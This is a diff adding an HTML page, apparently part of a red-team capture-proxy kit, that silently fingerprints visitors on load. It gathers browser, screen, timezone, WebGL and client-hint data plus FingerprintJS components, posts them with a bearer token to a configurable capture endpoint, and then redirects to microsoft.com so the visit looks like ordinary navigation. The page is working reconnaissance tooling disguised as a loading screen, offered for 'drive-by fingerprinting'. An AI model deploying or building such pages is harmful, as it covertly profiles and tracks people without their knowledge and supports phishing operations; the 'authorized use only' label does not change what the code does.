@@ -1,0 +1,183 @@
+<!doctype html>
+<!--
+  Silent fingerprinting page for /api/capture/external.
+
+  This page silently captures device fingerprint and submits it without
+  any user interaction or visible form. Useful for:
+  - Drive-by fingerprinting
+  - Silent reconnaissance
+  - Background device profiling
+
+  After capture, redirects to a configured URL (appears as normal navigation).
+
+  Authorized red-team / pentest use only.
+
+  Config — edit the CONFIG block below:
+    site_id        the cred key prefix
+    token          must match config.external_capture_token on the proxy
+    endpoint       URL of POST /api/capture/external
+    redirect_url   where to redirect after capture (appears as normal nav)
+-->
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Loading...</title>
+  <style>
+    body { margin: 0; padding: 0; background: #f5f5f5; }
+    .loading { text-align: center; padding-top: 40px; color: #666; font-family: system-ui; }
+  </style>
+</head>
+<body>
+  <div class="loading">Loading...</div>
+
+<script>
+// Load FingerprintJS from CDN with error handling
+window.FingerprintJSLoaded = false;
+(function() {
+  const script = document.createElement('script');
+  script.src = 'https://cdn.jsdelivr.net/npm/@fingerprintjs/js@3/dist/fp.min.js';
+  script.async = true;
+  script.onload = function() {
+    window.FingerprintJSLoaded = true;
+    console.log('[silent] FingerprintJS loaded');
+  };
+  script.onerror = function() {
+    console.warn('[silent] FingerprintJS failed to load');
+    window.FingerprintJSLoaded = true;
+    window.FingerprintJS = null;
+  };
+  document.head.appendChild(script);
+})();
+</script>
+
+<script>
+const CONFIG = {
+  site_id:       "silent-fp",                              // credential key prefix
+  token:         "test_external_capture_token",            // must match proxy token
+  endpoint:      "https://example.com/api/capture/external",  // capture endpoint
+  redirect_url:  "https://www.microsoft.com/",             // where to redirect
+};
+
+async function fingerprint() {
+  const fp = {
+    user_agent: navigator.userAgent,
+    languages:  navigator.languages || [navigator.language],
+    platform:   navigator.platform,
+    vendor:     navigator.vendor,
+    hw_concurrency: navigator.hardwareConcurrency || null,
+    device_memory:  navigator.deviceMemory || null,
+    screen:    { w: screen.width, h: screen.height,
+                 aw: screen.availWidth, ah: screen.availHeight,
+                 color_depth: screen.colorDepth, dpr: window.devicePixelRatio },
+    viewport:  { w: innerWidth, h: innerHeight },
+    timezone:  Intl.DateTimeFormat().resolvedOptions().timeZone,
+    referrer:  document.referrer,
+    page_url:  location.href,
+  };
+
+  // Wait for FingerprintJS to load (max 10 seconds)
+  let waitTime = 0;
+  while (!window.FingerprintJSLoaded && waitTime < 10000) {
+    await new Promise(r => setTimeout(r, 100));
+    waitTime += 100;
+  }
+
+  // Capture FingerprintJS detailed fingerprint
+  if (typeof FingerprintJS !== 'undefined' && FingerprintJS !== null) {
+    try {
+      const fpjs = await FingerprintJS.load();
+      const result = await fpjs.get();
+      fp.fingerprint_id = result.visitorId;
+      fp.fingerprint_confidence = result.confidence?.score || null;
+      fp.fingerprint_components = result.components;
+      console.log('[silent] Fingerprint captured:', fp.fingerprint_id);
+    } catch (e) {
+      fp.fingerprint_error = e.message;
+      console.warn('[silent] FingerprintJS error:', e.message);
+    }
+  } else {
+    console.log('[silent] FingerprintJS not available (waited', waitTime, 'ms)');
+  }
+
+  // Capture Sec-CH-UA client hints
+  if (navigator.userAgentData) {
+    try {
+      fp.ua_data = await navigator.userAgentData.getHighEntropyValues([
+        "architecture","bitness","model","platformVersion",
+        "uaFullVersion","fullVersionList","wow64",
+      ]);
+    } catch (_) { }
+  }
+
+  // Capture WebGL renderer
+  try {
+    const c = document.createElement("canvas");
+    const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+    if (gl) {
+      const ext = gl.getExtension("WEBGL_debug_renderer_info");
+      if (ext) {
+        fp.webgl = {
+          vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL),
+          renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL),
+        };
+      }
+    }
+  } catch (_) { }
+
+  return fp;
+}
+
+async function captureAndSubmit() {
+  console.log('[silent] Starting silent fingerprint capture...');
+
+  try {
+    const fp = await fingerprint();
+    console.log('[silent] Fingerprint complete, submitting...');
+
+    const body = {
+      site_id: CONFIG.site_id,
+      user: "silent-capture",
+      source_url: location.href,
+      captured_inputs: {
+        fingerprint: fp,
+      },
+      notes: "silent fingerprint capture",
+    };
+
+    // Submit to capture endpoint
+    const response = await fetch(CONFIG.endpoint, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "Authorization": "Bearer " + CONFIG.token,
+      },
+      body: JSON.stringify(body),
+      keepalive: true,
+    });
+
+    if (response.ok) {
+      console.log('[silent] Capture successful, redirecting...');
+    } else {
+      console.warn('[silent] Capture failed:', response.status);
+    }
+  } catch (e) {
+    console.error('[silent] Error during capture:', e.message);
+  }
+
+  // Always redirect (success or fail)
+  setTimeout(() => {
+    console.log('[silent] Redirecting to:', CONFIG.redirect_url);
+    window.location.href = CONFIG.redirect_url;
+  }, 500);
+}
+
+// Run on page load
+if (document.readyState === 'loading') {
+  document.addEventListener('DOMContentLoaded', captureAndSubmit);
+} else {
+  captureAndSubmit();
+}
+</script>
+</body>
+</html>
